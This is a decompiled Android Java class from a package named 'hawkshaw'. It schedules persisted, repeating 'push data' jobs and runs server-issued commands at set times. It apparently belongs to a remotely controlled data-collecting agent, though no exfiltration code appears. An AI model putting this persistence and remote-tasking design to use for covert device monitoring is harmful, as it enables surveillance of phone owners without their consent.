package com.hawkshaw.library.handler;

import E.k;
import F3.b;
import T1.c;
import W2.e;
import W2.l;
import Y1.K;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import androidx.core.app.NotificationCompat;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;

public final class JobScheduler {
    private static final int ALARM_REQUEST_CODE = 1234;
    public static final JobScheduler INSTANCE = new JobScheduler();
    private static final int JOB_ID = 1234;
    private static final String TAG = "JobScheduler";
    private static final e ctx$delegate = new l(c.f1912D);
    private static final long interval = 28800000;

    private JobScheduler() {
    }

    private final Context getCtx() {
        return (Context) ctx$delegate.getValue();
    }

    private final void scheduleAlarm(long j5) {
        Object systemService = getCtx().getSystemService(NotificationCompat.CATEGORY_ALARM);
        K.l(systemService, "null cannot be cast to non-null type android.app.AlarmManager");
        Intent intent = new Intent(getCtx(), AlarmReceiver.class);
        intent.putExtra("source", "ScheduleAlarm");
        ((AlarmManager) systemService).setExactAndAllowWhileIdle(0, System.currentTimeMillis() + j5 + 1000, PendingIntent.getBroadcast(INSTANCE.getCtx(), 1234, intent, 33554432));
    }

    private final void scheduleJob(long j5) {
        android.app.job.JobScheduler jobScheduler = (android.app.job.JobScheduler) k.getSystemService(getCtx(), android.app.job.JobScheduler.class);
        if (jobScheduler != null) {
            Logger.v$default(Logger.INSTANCE, TAG, C0528x.b("JobSchedulerResult: ", jobScheduler.schedule(new JobInfo.Builder(1234, new ComponentName(getCtx().getPackageName(), SchedulerJobService.class.getName())).setRequiresBatteryNotLow(true).setRequiredNetworkType(1).setMinimumLatency(j5).setOverrideDeadline(j5 * ((long) 2)).setPersisted(true).build())), false, 4, (Object) null);
        }
    }

    public static /* synthetic */ void startScheduler$default(JobScheduler jobScheduler, Command.StartRepeatPushDataRequest startRepeatPushDataRequest, int i5, Object obj) {
        if ((i5 & 1) != 0) {
            startRepeatPushDataRequest = null;
        }
        jobScheduler.startScheduler(startRepeatPushDataRequest);
    }

    public final void cancelScheduledCommand(Command.CancelScheduledCommandRequest cancelScheduledCommandRequest) {
        K.n(cancelScheduledCommandRequest, "request");
        Object systemService = getCtx().getSystemService(NotificationCompat.CATEGORY_ALARM);
        K.l(systemService, "null cannot be cast to non-null type android.app.AlarmManager");
        AlarmManager alarmManager = (AlarmManager) systemService;
        for (Number intValue : cancelScheduledCommandRequest.getRequestCodes()) {
            int intValue2 = intValue.intValue();
            JobScheduler jobScheduler = INSTANCE;
            Intent intent = new Intent(jobScheduler.getCtx(), AlarmReceiver.class);
            intent.setAction(AlarmReceiver.ACTION_SCHEDULE_COMMAND);
            alarmManager.cancel(PendingIntent.getBroadcast(jobScheduler.getCtx(), intValue2, intent, 33554432));
        }
    }

    public final void scheduleCommand(Command.ScheduleCommandRequest scheduleCommandRequest) {
        K.n(scheduleCommandRequest, "request");
        Object systemService = getCtx().getSystemService(NotificationCompat.CATEGORY_ALARM);
        K.l(systemService, "null cannot be cast to non-null type android.app.AlarmManager");
        AlarmManager alarmManager = (AlarmManager) systemService;
        Intent intent = new Intent(getCtx(), AlarmReceiver.class);
        intent.setAction(AlarmReceiver.ACTION_SCHEDULE_COMMAND);
        intent.putExtra("source", "ScheduleAlarm");
        b json = ContentNegotiationInterceptorKt.getJson();
        Command command = scheduleCommandRequest.getCommand();
        json.getClass();
        intent.putExtra("command", json.b(Command.Companion.serializer(), command));
        PendingIntent broadcast = PendingIntent.getBroadcast(INSTANCE.getCtx(), scheduleCommandRequest.getRequestCode(), intent, 33554432);
        if (scheduleCommandRequest.getInterval() > 0) {
            long triggerAt = scheduleCommandRequest.getTriggerAt();
            long interval2 = scheduleCommandRequest.getInterval();
            long j5 = 900000;
            if (interval2 >= 900000) {
                j5 = interval2;
            }
            alarmManager.setRepeating(0, triggerAt, j5, broadcast);
            return;
        }
        alarmManager.setExact(0, scheduleCommandRequest.getTriggerAt(), broadcast);
    }

    public final void startScheduler(Command.StartRepeatPushDataRequest startRepeatPushDataRequest) {
        long intervalMillis = startRepeatPushDataRequest != null ? startRepeatPushDataRequest.getIntervalMillis() : interval;
        stopScheduler();
        scheduleJob(intervalMillis);
        scheduleAlarm(intervalMillis);
    }

    public final void stopScheduler() {
        Object systemService = getCtx().getSystemService(NotificationCompat.CATEGORY_ALARM);
        K.l(systemService, "null cannot be cast to non-null type android.app.AlarmManager");
        ((AlarmManager) systemService).cancel(PendingIntent.getBroadcast(INSTANCE.getCtx(), 1234, new Intent(getCtx(), AlarmReceiver.class), 33554432));
        android.app.job.JobScheduler jobScheduler = (android.app.job.JobScheduler) k.getSystemService(getCtx(), android.app.job.JobScheduler.class);
        if (jobScheduler != null) {
            jobScheduler.cancel(1234);
        }
    }
}
